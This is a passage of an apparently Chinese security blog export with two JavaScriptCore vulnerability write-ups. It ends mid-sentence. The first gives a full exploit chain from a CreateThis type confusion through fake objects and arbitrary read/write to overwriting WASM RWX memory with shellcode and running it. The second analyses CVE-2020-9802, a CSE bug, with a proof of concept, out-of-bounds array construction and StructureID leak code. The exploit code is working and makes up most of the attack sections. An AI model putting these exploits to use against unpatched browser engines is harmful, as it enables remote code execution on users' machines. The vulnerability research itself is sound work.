foo_proxy(arr);print(b.x);\n这样，当CreateThis回调了handler中的get函数时，arr[0] &#x3D; {}将arr的类型改为了对象数组类型，不再是unboxed double，但是CreateThis回调结束以后，并没有重新对arg进行类型检查，仍然将其当做unboxed double类型，由此造成了类型混淆。运行结果如下，成功输出对象的地址\nroot@ubuntu:~/Desktop/bug_bin# ./jsc t.js6.9532879215489e-310\n修复漏洞以后的版本，其DFG JIT的字节码展开如下\n[10]CountExecutionCreateThisMovHint[18]CountExecutionJSConstantCheckStructureGetButterflyGetByValMovHintValueRep\n可以看到，其在CreateThis后面增加了一个CheckStructure，从而避免了类型混淆。\n漏洞利用fakeObj和addressOf原语构造通过上述分析，我们很容易构造出两个原语\nfunction addressOf(obj) &#123;   function foo(arg) &#123;      this.x = arg[0];   &#125;   var handler = &#123;      get(target,prop) &#123;         if (trigger) &#123;            arr[0] = obj;         &#125;         return target[prop];      &#125;   &#125;;   var foo_proxy = new Proxy(foo,handler);   var arr = [1.1,2.2,3.3];   var trigger = false;   for (var i = 0; i &lt; 0x2000; i++) &#123;      new foo_proxy(arr);   &#125;   trigger = true;   var ret = new foo_proxy(arr);   return u64f(ret.x);&#125;function fakeObject(addr_l,addr_h) &#123;   var addr = p64f(addr_l,addr_h);   function foo(arr) &#123;      arr[0] = addr;   &#125;   var handler = &#123;      get(target,prop) &#123;         if (trigger) &#123;            arr[0] = &#123;&#125;;         &#125;         return target[prop];      &#125;   &#125;;   var foo_proxy = new Proxy(foo,handler);   var arr = [1.1,2.2,3.3];   var trigger = false;   for (var i = 0;i &lt; 0x2000; i++) &#123;      new foo_proxy(arr);   &#125;   trigger = true;   new foo_proxy(arr);   return arr[0];&#125;\n堆喷StructureID为了伪造一个数组对象，首先得拿到数组对象的StructureID，由于其是一串数字，并且对数组对象增加不同的属性即可使得StructureID不同，依次递增，因此，我们申请一些列不同原型的数组对象，然后随便猜测一个StructureID\n//制造N个对象，每个对象产生不一样的Structures，使得我们可以猜测一个可用的StructuresIDvar structs = [];function sprayStructures() &#123;   var fake_elements_header = p64f(0,0);   for (var i = 0; i &lt; 1000; i++) &#123;      var a = &#123;x:1,y:2&#125;;      for (var j=0;j&lt;0xffff;j++)         a[j] = 23.33;      a[&#x27;x&#x27; + i] = fake_elements_header;      a.prop = 1.1;      structs.push(a);   &#125;&#125;sprayStructures();\n伪造数组对象var victim = structs[0x300];var jscell_double = p64f(0x00000200,0x01082007);//对象的内存地址必须对齐，因此我们增加一个paddingvar container = &#123;   padding:1.1,   jscell:jscell_double,   butterfly:victim,   butterflyIndexingMask:p64f(0x11111111,0x0)&#125;var container_addr = addressOf(container);var hax = fakeObject(container_addr[0]+0x20,container_addr[1]);\n这里，我们将butterfly直接指向了victim，由于是对象，因此存储的是指针，所以通过hax，我们可以控制victim对象的整个结构，victim同样也是一个数组，我们这样做的目的是避免多次通过fakeObject和addressOf来伪造对象，因为这比较耗时并且可能影响内存布局，我们只需第一次伪造一个对象能够控制已有的对象，后面就可以方便操作，同样我们利用has和victim重新构造一个快速的NewAddressOf和NewFakeObject\n// ArrayWithDouble//var unboxed = [6.66,6.66,6.66];var unboxed = structs[0x301];var a = &#123;x:1,y:2&#125;;//for (var j=0;j&lt;0xffff;j++)   //a[j] = 23.33;a[&#x27;x0&#x27;] = p64f(0,0);// ArrayWithContiguousvar boxed = &#123;x:1,y:2&#125;;boxed[0] = &#123;&#125;;//让boxed和unboxed的Butterfly为同一地址var d = addressOf(unboxed);hax[1] = p64f(d[0],d[1]);var sharedButterfly = victim[1];d = addressOf(boxed);hax[1] = p64f(d[0],d[1]);victim[1] = sharedButterfly;debug(describe(unboxed));debug(describe(boxed));debug(describe(victim));function NewAddressOf(obj) &#123;   boxed[0] = obj;   return u64f(unboxed[0]);&#125;function NewFakeObject(addr_l,addr_h) &#123;   var addr = p64f(addr_l,addr_h);   unboxed[0] = addr;   return boxed[0];&#125;\n构造read64和write64原语function read64(addr_l,addr_h,index = 0) &#123;   //必须保证在vicim[-1]处有数据，即used slots和max slots字段，否则将导致读取失败   //因此我们换用另一种方法，即利用property去访问   hax[1] = p64f(addr_l + 0x10,addr_h);   return NewAddressOf(victim.prop);&#125;function write64(addr_l,addr_h,double_val) &#123;   hax[1] = p64f(addr_l + 0x10,addr_h);   victim.prop = double_val;&#125;\n这里，我们不使用数组的方式去实现任意地址读写，因为数组的方式需要保证used slots和max slots字段满足要求，任意地址处不可能一直满足这个要求，因此我们使用外属性的方式，前面介绍过，这种外部属性就存储于butterfly前面，使用read的时候，最后需要加上NewAddressOf进行转换，因为属性的存储是按照前面介绍的这个\nPointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）Double： [0001～FFFE][xxxx:xxxx:xxxx]Integer： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）False： [0000:0000:0000:0006]True： [0000:0000:0000:0007]Undefined： [0000:0000:0000:000a]Null： [0000:0000:0000:0002]\n方式存储的，显然我们读取的数据不满足这个要求，直接使用victim.prop返回的值会导致崩溃，当我们需要读取的数据是一些地址的时候，由于地址往往就48位，因此其高2字节为0，此时这个数据会被当成一个对象地址，因此为了拿到这个值，需要加上一层NewAddressOf，同理，在write64的时候如果写入的数据高2字节为0，需要加上一层NewFakeObject，由于我们写入的是double，就不需要，但是double数据会导致第7个字节的低4位为1，因此，我们不能一次性写入8个字节的完好数据，但是我们可以保证低4字节的数据被正确写入到目标处，因此，我们只需将数据拆分为4字节一组，然后包装为8字节的double，即可依次将数据完整的写入。\n劫持WASM，写shellcodeconst wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var funcObj_addr = addressOf(func);var codeAddr = read64(funcObj_addr[0] + 0x48,funcObj_addr[1],1);var rwx_addr = read64(codeAddr[0],codeAddr[1],1);debug(&quot;funcObj_addr=&quot; + funcObj_addr[1].toString(16) + funcObj_addr[0].toString(16));debug(&quot;codeAddr=&quot; + codeAddr[1].toString(16) + codeAddr[0].toString(16));debug(&quot;rwx_addr=&quot; + rwx_addr[1].toString(16) + rwx_addr[0].toString(16));//替换jit的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   write64(rwx_addr[0] + i*4,rwx_addr[1],p64f(shellcode[i],0));&#125;//执行shellcodefunc();\n成功利用\n\n\n0x03 感想JSC的漏洞利用本质上与V8的漏洞利用相似，分析方法也类似，这些JS引擎的漏洞挖掘方法大多有着共同点。通过本次复现，又收获了许多新知识。\n0x04 参考FireShell2020——从一道ctf题入门jsc利用Webkit Exploitation Tutorialwiki JavaScriptCore【编译原理】中间代码（一）深入剖析 JavaScriptCoreAttacking Client-Side JIT Compilers (v2) Samuel Groß (@5aelo)JavaScriptCore内部原理（一）：从JS源码到字节码的追踪WebKit commitdiff\n","categories":["CTF","安全研究","CVE"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"CVE-2020-9802 JSC CSE漏洞分析","url":"/2021/07/07/CVE-2020-9802/","content":"文章首发于安全KER https://www.anquanke.com/post/id/245946\n0x00 前言编译器优化中有一项CSE（公共子表达式消除），如果JS引擎在执行时类型收集的不正确，将导致表达式被错误的消除引发类型混淆。\n0x01 前置知识CSE公共子表达式消除即为了去掉那些相同的重复计算，使用代数变换将表达式替换，并删除多余的表达式，如\nlet c = Math.sqrt(a*a + a*a);\n将被优化为\nlet tmp = a*a;let c = Math.sqrt(tmp + tmp);\n这样就节省了一次乘法，现在我们来看下列代码\nlet c = o.a;f();let d = o.a;\n由于在两个表达式之间多了一个f()函数的调用，而函数中很有可能改变.a的值或者类型，因此这两个公共子表达式不能直接消除，编译器会收集o.a的类型信息，并跟踪f函数，收集信息，如果到f分析完毕，o.a的类型也没有改变，那么let d &#x3D; o.a;就可以不用再次检查o.a的类型。在JSC中，CSE优化需要考虑的信息在Source/JavaScriptCore/dfg/DFGClobberize.h中被定义，从文件路径可以知道，这是一个在DFG阶段的相关优化，文件中有一个clobberize函数，\ntemplate&lt;typename ReadFunctor, typename WriteFunctor, typename DefFunctor&gt;void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFunctor&amp; write, const DefFunctor&amp; def)&#123;.............................................    case CompareEqPtr:        def(PureValue(node, node-&gt;cellOperand()-&gt;cell()));        return;..............................................\nclobberize函数中的def操作定义了CSE优化时需要考虑的因素，例如上面的def(PureValue(node, node-&gt;cellOperand()-&gt;cell()));，如果要对CompareEqPtr运算进行CSE优化，需要考虑的因素除了value本身的值，还需要的是Operand（操作数）的类型(cell)。\n边界检查消除与V8的checkbounds消除类似，当数组的下标分析确定在数组的大小范围之内，则可以消除边界检查，但如果编译器本身的检查方式出现溢出等问题，编译器认为idx在范围之内而实际则可能不在范围内，错误的消除边界检查将导致数组溢出。为了研究JSC在什么条件下可以消除边界检查，我们使用如下代码进行测试调试\nfunction foo(arr,idx) &#123;   idx = idx | 0;   if (idx &lt; arr.length) &#123;      if (idx &amp; 0x3) &#123;         idx += -2;      &#125;      if (idx &gt;= 0) &#123;         return arr[idx];      &#125;   &#125;&#125;var arr = [1.1,2.2,3.3,4.4,5.5,6.6];for (var i=0;i&lt;0xd0000;i++) &#123;   foo(arr,2);&#125;debug(describe(arr));print();debug(foo(arr,0x3));\n给print的函数断点用于中断脚本以进行调试b *printInternal，运行时加上-p选项将优化时的数据输出为json，从json文件中，我们看到foo函数的字节码\n[   0] enter[   1] get_scope          loc4[   3] mov                loc5, loc4[   6] check_traps        [   7] bitor              arg2, arg2, Int32: 0(const0)[  12] get_by_id          loc6, arg1, 0[  17] jnless             arg2, loc6, 29(-&gt;46)[  21] bitand             loc6, arg2, Int32: 3(const1)[  26] jfalse             loc6, 9(-&gt;35)[  29] add                arg2, arg2, Int32: -2(const2), OperandTypes(126, 3)[  35] jngreatereq        arg2, Int32: 0(const0), 11(-&gt;46)[  39] get_by_val         loc6, arg1, arg2[  44] ret                loc6[  46] ret                Undefined(const3)\n其中[  39] get_by_val         loc6, arg1, arg2用于从数组中取出数据，在DFG JIT时，其展开的汇编代码为\n0x7fffaf101fa3: mov $0x7fffaef0bb48, %r110x7fffaf101fad: mov (%r11), %r110x7fffaf101fb0: test %r11, %r110x7fffaf101fb3: jz 0x7fffaf101fc00x7fffaf101fb9: mov $0x113, %r11d0x7fffaf101fbf: int3 0x7fffaf101fc0: mov $0x7fffaef000dc, %r110x7fffaf101fca: mov $0x0, (%r11)0x7fffaf101fce: cmp -0x8(%rdx), %esi0x7fffaf101fd1: jae 0x7fffaf1024cb0x7fffaf101fd7: movsd (%rdx,%rsi,8), %xmm00x7fffaf101fdc: ucomisd %xmm0, %xmm00x7fffaf101fe0: jp 0x7fffaf1024f2\n其中的\n0x7fffaf101fce: cmp -0x8(%rdx), %esi0x7fffaf101fd1: jae 0x7fffaf1024cb\n用于检查下标是否越界，可见DFG JIT阶段并不会去除边界检查，尽管我们在代码中使用了if语句将idx限定在了数组的长度范围之内。边界检查去除表现在FTL JIT的汇编代码中，从json文件中可以看到FTL JIT时，对字节码字节码[  39] get_by_val         loc6, arg1, arg2的展开如下\nD@86:&lt;!0:-&gt;\tExitOK(MustGen, W:SideState, bc#39, ExitValid)D@63:&lt;!0:-&gt;\tCountExecution(MustGen, 0x7fffac9cf140, R:InternalState, W:InternalState, bc#39, ExitValid)D@66:&lt;!2:-&gt;\tGetByVal(KnownCell:Kill:D@14, Int32:Kill:D@10, Check:Untyped:Kill:D@68, Check:Untyped:D@10, Double|MustGen|VarArgs|UseAsOther, AnyIntAsDouble|NonIntAsDouble, Double+OriginalCopyOnWriteArray+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedDoubleProperties, Exits, bc#39, ExitValid)  predicting NonIntAsDoubleD@85:&lt;!0:-&gt;\tKillStack(MustGen, loc6, W:Stack(loc6), ClobbersExit, bc#39, ExitInvalid)D@67:&lt;!0:-&gt;\tMovHint(DoubleRep:D@66&lt;Double&gt;, MustGen, loc6, W:SideState, ClobbersExit, bc#39, ExitInvalid)ValueRep(DoubleRep:Kill:D@66&lt;Double&gt;, JS|PureInt, BytecodeDouble, bc#39, exit: bc#44, ExitValid)\n从中可以看到 GetByVal中传递的参数中含有InBounds标记，那么其汇编代码中将不会检查下标是否越界，因为前面已经确定下标在范围内。为了查看FTL JIT生成的汇编代码，我们使用gdb调试，遇到print语句时会断点停下此时，我们对butterfly中对应的位置下一个硬件读断点，然后继续运行\npwndbg&gt; rwatch *0x7ff803ee4018Hardware read watchpoint 79: *0x7ff803ee4018pwndbg&gt; cContinuing.\n然后断点断下\n  0x7fffaf101b9c    movabs r11, 0x7fffaef000dc  0x7fffaf101ba6    mov    byte ptr [r11], 0  0x7fffaf101baa    cmp    esi, dword ptr [rdx - 8]  0x7fffaf101bad    jae    0x7fffaf102071 &lt;0x7fffaf102071&gt;  0x7fffaf101bb3    movsd  xmm0, qword ptr [rdx + rsi*8]► 0x7fffaf101bb8    ucomisd xmm0, xmm0  0x7fffaf101bbc    jp     0x7fffaf102098 &lt;0x7fffaf102098&gt;\n我们发现这仍然存在cmp    esi, dword ptr [rdx - 8]检查了下标，这是由于FTL JIT是延迟优化的，可能还没优化过来，我们按照前面的步骤重新试一下\n  0x7fffaf1039fa    mov    eax, 0xa  0x7fffaf103a00    mov    rsp, rbp  0x7fffaf103a03    pop    rbp  0x7fffaf103a04    ret      0x7fffaf103a05    movsd  xmm0, qword ptr [rdx + rax*8]► 0x7fffaf103a0a    ucomisd xmm0, xmm0  0x7fffaf103a0e    jp     0x7fffaf103aeb &lt;0x7fffaf103aeb&gt;\n发现这次，边界检查被去除了，为了查看更多的代码片段，我们使用gdb的dump命令将这段代码dump出来用IDA分析\npwndbg&gt; vmmap 0x7fffaf103a0aLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x7fffaf0ff000     0x7fffaf104000 rwxp     5000 0       +0x4a0apwndbg&gt; dump memory ./2.bin 0x7fffaf0ff000 0x7fffaf104000pwndbg&gt; \n可以看到语句\nif (idx &amp; 0x3) &#123;   idx += -2;&#125;\n执行完毕后，无需再一次检查idx &lt; arr.length，因为这是一个减法操作，正常情况下idx减去一个正数肯定会变小，小于arr.length，因此就去掉了边界检查。\n0x02 漏洞分析利用patch分析diff --git a/Source/JavaScriptCore/dfg/DFGClobberize.h b/Source/JavaScriptCore/dfg/DFGClobberize.hindex b2318fe03aed41e0309587e7df90769cb04e3c49..5b34ec5bd8524c03b39a1b33ba2b2f64b3f563e1 100644 (file)--- a/Source/JavaScriptCore/dfg/DFGClobberize.h+++ b/Source/JavaScriptCore/dfg/DFGClobberize.h@@ -228,7 +228,7 @@ void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFu      case ArithAbs:         if (node-&gt;child1().useKind() == Int32Use || node-&gt;child1().useKind() == DoubleRepUse)-            def(PureValue(node));+            def(PureValue(node, node-&gt;arithMode()));         else &#123;             read(World);             write(Heap);@@ -248,7 +248,7 @@ void clobberize(Graph&amp; graph, Node* node, const ReadFunctor&amp; read, const WriteFu         if (node-&gt;child1().useKind() == Int32Use             || node-&gt;child1().useKind() == DoubleRepUse             || node-&gt;child1().useKind() == Int52RepUse)-            def(PureValue(node));+            def(PureValue(node, node-&gt;arithMode()));         else &#123;             read(World);             write(Heap);\n该patch修复了漏洞，从patch中可以知道，这原本是一个跟CSE优化有关的漏洞，patch中加入了node-&gt;arithMode()参数，那么在CSE优化时，不仅要考虑操作数的值，还要考虑算术运算中出现的溢出等因素，即使最终的值一样，如果其中一个表达式是溢出的，也不能进行CSE优化。\nPOC构造首先从patch可以知道，修改的内容分别在ArithAbs和ArithNegate分支，它们分别对应了JS中的Math.abs和-运算。尝试构造如下代码\nfunction foo(n) &#123;   if (n &lt; 0) &#123;      let a = -n;      let b = Math.abs(n);      debug(b);   &#125;&#125;for (var i=0;i&lt;0x30000;i++) &#123;   foo(-2);&#125;\nfoo部分字节码如下\n[  17] negate             loc7, arg1, 126..........[  48] call               loc6, loc8, 2, 18\n分别代表了-n和Math.abs(n);，在DFG JIT阶段，其展开为如下\n[ 17]CountExecutionGetLocalArithNegate(Int32:D@39, Int32|PureInt, Int32, Unchecked, Exits, bc#17, ExitValid)MovHint[ 48]CountExecutionFilterCallLinkStatusArithAbs(Int32:D@39, Int32|UseAsOther, Int32, CheckOverflow, Exits, bc#48, ExitValid)PhantomPhantomMovHint\n在FTL JIT阶段，代码变化如下\n[ 17]CountExecutionArithNegate(Int32:Kill:D@76, Int32|PureInt, Int32, Unchecked, Exits, bc#17, ExitValid)KillStackZombieHint[ 48]CountExecutionFilterCallLinkStatusKillStackZombieHint\n可以看到ArithAbs被去除了，这就是漏洞所在，ArithAbs与ArithNegate的不同点在于，ArithNegate不检查溢出，而ArithAbs会检查溢出，因此对于0x80000000这个值，-0x80000000值仍然为-0x80000000，是一个32位数据，而Math.abs(-0x80000000)将扩展位数，值为0x80000000。显然编译器没有察觉到这一点，将ArithAbs与ArithNegate认为是公共子表达式，于是便可以进行互相替换。因此构造的POC如下\nfunction foo(n) &#123;   if (n &lt; 0) &#123;      let a = -n;      let b = Math.abs(n);      debug(b);   &#125;&#125;for (var i=0;i&lt;0xc0000;i++) &#123;   foo(-2);&#125;foo(-0x80000000);\n程序输出如下\n..............--&gt; 2--&gt; 2--&gt; 2--&gt; 2--&gt; 2--&gt; -2147483648\n可以看到，这个值并不是Math.abs(-0x80000000)的准确值。\nOOB数组构造利用边界检查消除来进行数组的溢出\nfunction foo(arr,n) &#123;   if (n &lt; 0) &#123;      let a = -n;      let idx = Math.abs(n);      if (idx &lt; arr.length) &#123; //确定在边界之内         if (idx &amp; 0x80000000) &#123; //对于0x80000000，我们减去一个数,以将idx变换到任意正值            idx += -0x7ffffffd;         &#125;         if (idx &gt;= 0) &#123; //确定在边界之内            return arr[idx]; //溢出         &#125;      &#125;   &#125;&#125;var arr = [1.1,2.2,3.3];for (var i=0;i&lt;0xc0000;i++) &#123;   foo(arr,-2);&#125;debug(foo(arr,-0x80000000));\n因为编译器的错误优化，idx是一个32位数，那么idx &lt; arr.length的检查通过，那么后续的return arr[idx]; //溢出将不会检查右边界，因此可以溢出数据。通过测试，发现POC有时可以成功溢出，有时不能\nroot@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; 1.5488838078e-314root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; undefined\n这是因为漏洞最终发生在FTL JIT，这个是延迟优化的，可能在执行最后的debug(foo(arr,-0x80000000));还没生成好JIT代码，因此具有微小的随机性，不影响漏洞利用。为了查看FTL JIT的汇编代码，我们使用前面介绍的方法，对arr的butterfly下硬件断点，然后停下时将代码片段dump出来\nseg000:00007FFFAF10346F                 mov     ecx, eaxseg000:00007FFFAF103471                 neg     ecxseg000:00007FFFAF103473                 mov     rdx, [rdx+8]seg000:00007FFFAF103477                 cmp     ecx, [rdx-8]seg000:00007FFFAF10347A                 jl      loc_7FFFAF103496seg000:00007FFFAF103480                 mov     dword ptr [rsi+737C1Ch], 1seg000:00007FFFAF10348A                 mov     rax, 0Ahseg000:00007FFFAF103491                 mov     rsp, rbpseg000:00007FFFAF103494                 pop     rbpseg000:00007FFFAF103495                 retnseg000:00007FFFAF103496 ; ---------------------------------------------------------------------------seg000:00007FFFAF103496seg000:00007FFFAF103496 loc_7FFFAF103496:                       ; CODE XREF: seg000:00007FFFAF10347A↑jseg000:00007FFFAF103496                 test    ecx, 80000000hseg000:00007FFFAF10349C                 jnz     loc_7FFFAF1034E8seg000:00007FFFAF1034A2                 test    ecx, ecxseg000:00007FFFAF1034A4                 jns     loc_7FFFAF1034C0................seg000:00007FFFAF1034E8 loc_7FFFAF1034E8:                       ; CODE XREF: seg000:00007FFFAF10349C↑jseg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003hseg000:00007FFFAF1034EF                 sub     ecx, eaxseg000:00007FFFAF1034F1                 test    ecx, ecxseg000:00007FFFAF1034F3                 jns     loc_7FFFAF1034C0seg000:00007FFFAF1034F9                 jmp     loc_7FFFAF1034AA................seg000:00007FFFAF1034C0 loc_7FFFAF1034C0:                       ; CODE XREF: seg000:00007FFFAF1034A4↑jseg000:00007FFFAF1034C0                                         ; seg000:00007FFFAF1034F3↓jseg000:00007FFFAF1034C0                 mov     eax, ecxseg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]seg000:00007FFFAF1034C7                 ucomisd xmm0, xmm0seg000:00007FFFAF1034CB                 jp      loc_7FFFAF1035A8seg000:00007FFFAF1034D1                 movq    rax, xmm0seg000:00007FFFAF1034D6                 sub     rax, rdiseg000:00007FFFAF1034D9                 mov     dword ptr [rsi+737C1Ch], 1seg000:00007FFFAF1034E3                 mov     rsp, rbpseg000:00007FFFAF1034E6                 pop     rbpseg000:00007FFFAF1034E7                 retn\n从中可以看出，上述汇编代码正好印证了我们前面的分析，neg     ecx代表了Math.abs()，然后cmp     ecx, [rdx-8]比较右边界，但由于ecx是32位，0x80000000比较通过，然后\nseg000:00007FFFAF1034E8                 mov     rcx, 0FFFFFFFF80000003hseg000:00007FFFAF1034EF                 sub     ecx, eax\n使得ecx为3，最后通过\nseg000:00007FFFAF1034C0                 mov     eax, ecxseg000:00007FFFAF1034C2                 movsd   xmm0, qword ptr [rdx+rax*8]\n进行数组溢出读取数据。那么我们可以用同样的方法，越界写改写下一个数组对象butterfly中的length和capacity，从而构造一个oob的数组对象。首先要在内存上布局三个相邻的数组对象\narr0 ArrayWithDouble,arr1 ArrayWithDouble,arr2 ArrayWithContiguous,\n通过arr0溢出改写arr1的length和capacity，即可将arr1构造为oob的数组\nvar arr = [1.1,2.2,3.3];var oob_arr= [2.2,3.3,4.4];var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];debug(describe(arr));debug(describe(oob_arr));debug(describe(obj_arr));print();\n发现三个数组的butterfly不相邻，并且类型不大对\n--&gt; Object: 0x7fffef1a83e8 with butterfly 0x7fe00cee4010 (Structure 0x7fffae7f99e0:[0xee79, Array, &#123;&#125;, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049--&gt; Object: 0x7fffef1a8468 with butterfly 0x7fe00cee4040 (Structure 0x7fffae7f99e0:[0xee79, Array, &#123;&#125;, CopyOnWriteArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 61049--&gt; Object: 0x7fffef1a84e8 with butterfly 0x7fe00cefda48 (Structure 0x7fffae7f9860:[0xe077, Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 57463\n前两个类型为CopyOnWriteArrayWithDouble，导致它们与arr2的butterfly 不相邻，于是尝试这样构造\nlet noCow = 13.37;var arr = [noCow,2.2,3.3];var oob_arr = [noCow,2.2,3.3];var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];debug(describe(arr));debug(describe(oob_arr));debug(describe(obj_arr));print();--&gt; Object: 0x7fffef1a6168 with butterfly 0x7fe01e4fda48 (Structure 0x7fffae7f9800:[0xcd04, Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484--&gt; Object: 0x7fffef1a61e8 with butterfly 0x7fe01e4fda68 (Structure 0x7fffae7f9800:[0xcd04, Array, &#123;&#125;, ArrayWithDouble, Proto:0x7fffef1bc2e8, Leaf]), StructureID: 52484--&gt; Object: 0x7fffef1a6268 with butterfly 0x7fe01e4fda88 (Structure 0x7fffae7f9860:[0x5994, Array, &#123;&#125;, ArrayWithContiguous, Proto:0x7fffef1bc2e8]), StructureID: 22932\n这回就相邻了，然后我们利用前面的漏洞构造oob数组\nfunction foo(arr,n) &#123;   if (n &lt; 0) &#123;      let a = -n;      let idx = Math.abs(n);      if (idx &lt; arr.length) &#123; //确定在边界之内         if (idx &amp; 0x80000000) &#123; //对于0x80000000，我们减去一个数,以将idx变换到任意正值            idx += -0x7ffffffd;         &#125;         if (idx &gt;= 0) &#123; //确定在边界之内            arr[idx] = 1.04380972981885e-310; //溢出         &#125;      &#125;   &#125;&#125;let noCow = 13.37;var arr = [noCow,2.2,3.3];var oob_arr = [noCow,2.2,3.3];var obj_arr = [&#123;&#125;,&#123;&#125;,&#123;&#125;];for (var i=0;i&lt;0xc0000;i++) &#123;   foo(arr,-2);&#125;foo(arr,-0x80000000);debug(oob_arr.length);\n输出如下，需要多次尝试，原因前面说过\nroot@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; 3root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; 3root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; 3root@ubuntu:~/Desktop/WebKit/WebKitBuild/Debug/bin# ./jsc poc.js--&gt; 4919\n利用oob_arr和obj_arr即可轻松构造出addressOf和fakeObject原语\n泄露StructureIDgetByVal在新版的JSC中，加入了StructureID随机化机制，使得我们前面介绍的喷射对象，并猜测StructureID的方法变得困难，成功率极大降低。因此需要使用其他方法，一种方法是利用getByVal，\nstatic ALWAYS_INLINE JSValue getByVal(VM&amp; vm, JSGlobalObject* globalObject, CodeBlock* codeBlock, JSValue baseValue, JSValue subscript, OpGetByVal bytecode)&#123;   ..............................    if (subscript.isUInt32()) &#123;       .......................        &#125; else if (baseValue.isObject()) &#123;            JSObject* object = asObject(baseValue);            if (object-&gt;canGetIndexQuickly(i))                return object-&gt;getIndexQuickly(i);\n其中canGetIndexQuickly源码如下\n    bool canGetIndexQuickly(unsigned i) const    &#123;        const Butterfly* butterfly = this-&gt;butterfly();        switch (indexingType()) &#123;...............        case ALL_DOUBLE_INDEXING_TYPES: &#123;            if (i &gt;= butterfly-&gt;vectorLength())                return false;            double value = butterfly-&gt;contiguousDouble().at(this, i);            if (value != value)                return false;            return true;        &#125;............    &#125;\ngetIndexQuickly代码如下\n    JSValue getIndexQuickly(unsigned i) const    &#123;.............        case ALL_DOUBLE_INDEXING_TYPES:            return JSValue(JSValue::EncodeAsDouble, butterfly-&gt;contiguousDouble().at(this, i));...............        &#125;    &#125;\n从上面可以知道getIndexQuickly这条路径不会使用到StructureID，那么如何触发getByVal呢？经过测试，发现对不是数组类型的对象，使用[]运算符可以触发到getByVal\nvar a = &#123;x:1&#125;;var b = a[0];debug(b);print();\n因此，我们可以尝试构造一个假的StructureID，使得它匹配StructureID时发现不是数组类型，就可以调用到getByVal\nvar arr_leak = new Array(noCow,2.2,3.3);function leak_structureID(obj) &#123;   let jscell_double = p64f(0x00000000,0x01062307);   let container = &#123;      jscell:jscell_double,      butterfly:obj   &#125;   let container_addr = addressOf(container);   let hax = fakeObject(container_addr[0]+0x10,container_addr[1]);   f64[0] = hax[0];   let structureID = u32[0];   //修复JSCell   u32[1] = 0x01082307 - 0x20000;   container.jscell = f64[0];;   return structureID;&#125;var structureID = leak_structureID(arr_leak);debug(structureID);print();\n调试如下baseValue.isObject()判断通过，将进入分支\n ► 962         &#125; else if (baseValue.isObject()) &#123;   963             JSObject* object = asObject(baseValue);   964             if (object-&gt;canGetIndexQuickly(i))   965                 return object-&gt;getIndexQuickly(i);   966    967             bool skipMarkingOutOfBounds = false;pwndbg&gt; p baseValue.isObject()$3 = true\n接下来，我们跟踪进入canGetIndexQuickly函数\nIn file: /home/sea/Desktop/WebKit/Source/JavaScriptCore/runtime/JSObject.h   272             return false;   273         case ALL_INT32_INDEXING_TYPES:   274         case ALL_CONTIGUOUS_INDEXING_TYPES:   275             return i &lt; butterfly-&gt;vectorLength() &amp;&amp; butterfly-&gt;contiguous().at(this, i);   276         case ALL_DOUBLE_INDEXING_TYPES: &#123; ► 277             if (i &gt;= butterfly-&gt;vectorLength())   278                 return false;   279             double value = butterfly-&gt;contiguousDouble().at(this, i);   280             if (value != value)   281                 return false;   282             return true;pwndbg&gt; p butterfly-&gt;vectorLength()$11 = 32767\n这里获取了容量，如果i在长度范围之内，则返回true，即可成功取得数据。由于这里我们是将arr_leak这个对象当成了butterfly，因此容量也就是&amp;arr_leak-0x4处的数据，即\npwndbg&gt; x /2wx 0x7fffef1613e8-0x80x7fffef1613e0:\t0xef1561a0\t0x00007fff\n与32767对应上了。由此我们看出，这种方法的条件是&amp;arr_leak-0x4处的数据要大于0即可，因此可以在内存布局的时候在arr_leak前面布置一个数组并用数据填充。如果不在前面布局一个数组用于填充，则利用程序将受到随机化的影响而不稳定。\nFunction.prototype.toString.call另一个方法是通过toString() 